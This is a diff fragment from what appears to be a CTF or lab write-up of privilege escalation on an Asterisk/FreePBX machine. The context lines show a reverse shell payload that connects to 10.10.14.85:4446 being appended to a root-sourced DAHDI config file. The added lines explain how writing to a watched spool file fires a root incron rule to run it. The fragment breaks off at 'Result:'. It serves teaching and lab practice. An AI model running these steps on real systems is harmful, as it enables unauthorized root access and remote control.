@@ -1261,6 +1261,18 @@ Append the reverse shell payload to the writable, root-sourced configuration fil
 <-i >& /dev/tcp/10.10.14.85/4446 0>&1" &' >> /etc/dahdi/init.conf            
 [asterisk@connected ghw5bmugvs]$ 
 ```
+
+**Command:** `echo trigger > /var/spool/asterisk/sysadmin/dahdi_restart`
+
+**Breakdown:**
+- `echo trigger`
+	- Description: Writes the string `trigger` to standard output.
+	- Purpose: Any write followed by a file close is sufficient to fire the IN_CLOSE_WRITE incron event — the content itself is irrelevant.
+- `> /var/spool/asterisk/sysadmin/dahdi_restart`
+	- Description: Redirects standard output into the watched file, overwriting its contents and then closing the file handle.
+	- Purpose: The file close-after-write event is precisely what the root incron rule subscribes to — this single redirect is the deliberate trigger that fires the entire privileged execution chain.
+
+**Result:**
 <div align="center">
 <br>
 <br>
